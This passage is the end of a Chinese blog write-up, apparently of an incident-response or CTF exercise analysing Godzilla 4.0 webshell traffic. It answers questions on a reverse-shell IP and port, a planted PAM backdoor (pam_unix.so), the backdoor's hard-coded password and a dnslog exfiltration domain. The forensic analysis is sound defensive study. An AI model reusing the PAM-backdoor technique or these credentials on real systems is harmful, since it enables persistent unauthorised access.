+  <a href="#10%e9%bb%91%e5%ae%a2%e7%95%99%e4%b8%8b%e5%90%8e%e9%97%a8%e7%9a%84%e5%8f%8d%e8%bf%9e%e7%9a%84-ip-%e5%92%8c-port-%e6%98%af%e4%bb%80%e4%b9%88ipport" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291844834.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291844834.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291844834.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291844834.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291844834.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291844834.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+反弹<code>shell</code>命令，解密其中<code>base64</code>字符串<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291845735.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291845735.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291845735.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291845735.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291845735.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291845735.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{192.168.31.143:1313}</code></p>
+<h4 id="11黑客通过什么文件留下了后门" class="heading-element"><span>11、黑客通过什么文件留下了后门？</span>
+  <a href="#11%e9%bb%91%e5%ae%a2%e9%80%9a%e8%bf%87%e4%bb%80%e4%b9%88%e6%96%87%e4%bb%b6%e7%95%99%e4%b8%8b%e4%ba%86%e5%90%8e%e9%97%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>通过前面分析黑客一直在安装<code>pam</code>后门<br>
+在数据包<code>56</code>发现黑客上传了<code>pam_unix.so</code>文件<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291852526.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291852526.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291852526.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291852526.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291852526.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291852526.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{pam_unix.so}</code></p>
+<h4 id="12黑客设置的后门密码是什么" class="heading-element"><span>12、黑客设置的后门密码是什么？</span>
+  <a href="#12%e9%bb%91%e5%ae%a2%e8%ae%be%e7%bd%ae%e7%9a%84%e5%90%8e%e9%97%a8%e5%af%86%e7%a0%81%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>在<code>/tmp</code>目录下面，并没有发现<code>pam_unix.so</code>文件，这里上服务器查询一下<br>
+<code>find / -name &quot;pam*&quot; -type f -exec ls -lt {} + 2&gt;/dev/null | sort -k 6,7</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291856603.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291856603.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291856603.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291856603.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291856603.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291856603.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+时间可疑，拖下来放入<code>ida</code>分析一下<br>
+其<code>pam_sm_authenticate</code>是 <code>PAM</code>（可插拔认证模块）框架中的一个函数，主要用于用户身份验证。这个函数的作用是对用户提供的凭证（如密码）进行验证，通常是在 <code>PAM</code> 模块中实现的。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411292146656.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411292146656.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411292146656.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411292146656.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411292146656.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411292146656.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{XJ@123}</code></p>
+<h4 id="13黑客的恶意-dnslog-服务器地址是什么" class="heading-element"><span>13、黑客的恶意 dnslog 服务器地址是什么？</span>
+  <a href="#13%e9%bb%91%e5%ae%a2%e7%9a%84%e6%81%b6%e6%84%8f-dnslog-%e6%9c%8d%e5%8a%a1%e5%99%a8%e5%9c%b0%e5%9d%80%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>上面pam_unix.so中的dnslog地址<br>
+<code>flag{c0ee2ad2d8.ipv6.xxx.eu.org.}</code></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-11-29 23:46:20">Updated on 2024-11-29&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="第六章-哥斯拉4.0流量分析"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E5%93%A5%E6%96%AF%E6%8B%89-%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/" class="post-tag" title="Tags - 哥斯拉 流量解密">哥斯拉 流量解密</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/%E5%AE%9E%E6%88%98-%E8%A1%8C%E4%B8%9A%E6%94%BB%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-nav-item" rel="prev" title="实战-行业攻防应急响应"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>实战-行业攻防应急响应</a><a href="/java-ctf1/" class="post-nav-item" rel="next" title="Java-CTF(1)">Java-CTF(1)<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.16"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright order-5" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider">Web Security</span></div><div class="footer-line statistics"><span class="site-time" title='Website running ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">Website running ...</span></span></div><div class="footer-line visitor order-4">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"siteTime":"2024-01-14T23:31:00+08:00","version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
